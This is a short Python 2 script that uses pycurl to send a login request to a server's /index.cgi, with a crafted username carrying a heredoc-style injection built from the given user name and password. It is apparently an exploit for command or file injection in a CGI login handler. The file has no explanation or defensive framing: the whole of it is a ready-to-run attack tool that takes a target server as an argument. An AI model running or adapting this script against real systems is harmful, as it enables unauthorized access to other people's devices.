#!/bin/env python

import pycurl
import sys
from StringIO import StringIO
from urllib import urlencode

import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--server', dest="s")
parser.add_argument('--user', dest="u")
parser.add_argument('--pass', dest="p")
args = parser.parse_args();


inject = "\"<<EOL\n\n"+args.u.upper()+":"+args.p.upper()+"\nEOL\n;\"";

buffer = StringIO()

post = urlencode({
	'username' : inject,
	'password' : args.p.upper()
	})

c = pycurl.Curl()
c.setopt(c.URL, args.s+"/index.cgi")
c.setopt(c.WRITEDATA, buffer)
c.setopt(c.POSTFIELDS, post)
c.perform()
c.close()

body = buffer.getvalue()
# Body is a string in some encoding.
# In Python 2, we can print it without knowing what the encoding is.
print(body)
